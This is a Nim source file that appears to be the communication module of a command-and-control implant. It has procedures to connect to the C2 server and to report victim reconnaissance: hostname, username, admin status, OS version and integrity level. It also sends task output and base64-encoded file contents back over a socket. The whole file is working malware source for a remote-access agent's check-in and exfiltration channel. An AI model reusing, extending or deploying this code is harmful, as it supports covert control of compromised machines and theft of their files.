import net, base64, json

proc sendData(client: Socket, data: string) =
  client.send(encode(data) & "\r\n")

type DataType* = enum
  File, Text, Code, Image, Object

type 
  TaskOutput* = ref object
    task*: string
    taskId*: int
    error*: string
    data*: JsonNode

proc addData*(output: TaskOutput, dataType: DataType, name: string, contents: string) =
  let enContents = newJString(encode(contents))
  if output.data.isNil():
    output.data = %*{}
  case dataType:
  of File:
    output.data[name & "::file"] = enContents
  of Text:
    output.data[name & "::text"] = enContents
  of Code:
    output.data[name & "::code"] = enContents
  of Image:
    output.data[name & "::image"] = enContents
  of Object:
    output.data[name & "::object"] = enContents


proc sendOutput*(client: Socket, taskOutput: TaskOutput) =
  let j = %*
    {
      "task": taskOutput.task,
      "taskId": taskOutput.taskId,
      "error": taskOutput.error,
      "data": taskOutput.data
    }
  client.sendData($j)

proc identify*(client: Socket, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string) =
  let j = %*
    {
      "task": "identify",
      "taskId": taskId,
      "error": "",
      "data": {
        "hostname": hostname,
        "isAdmin": isAdmin,
        "username": username,
        "osType": osType,
        "ownIntegrity": ownIntegrity,
        "windowsOsVersionInfo": {
          "majorVersion": windowsVersionInfo.majorVersion,
          "minorVersion": windowsVersionInfo.minorVersion,
          "buildNumber": windowsVersionInfo.buildNumber,
        },
        "linuxOsVersionInfo": {
          "kernelVersion": linuxVersionInfo.kernelVersion
        }
      }
    }
  client.sendData($j)

proc connectToC2*(client: Socket) =
  let j = %*
    {
      "task": "connect",
      "taskId": -1,
      "error": "",
      "data": {}
    }
  client.sendData($j)

proc unknownTask*(client: Socket, taskId: int, taskName: string) =
  let j = %*
    {
      "task": taskName,
      "taskId": taskId,
      "error": "unknown task",
      "data": {}
    }
  client.sendData($j)

proc sendFile*(client: Socket, taskId: int, path: string, b64c: string, error: string = "") =
  let j = %*
    {
      "task": "file",
      "taskId": taskId,
      "error": error,
      "data": {
        "path": path,
        "contents": b64c
      }
    }
  client.sendData($j)

proc newTaskOutput*(taskId: int): TaskOutput =
  TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )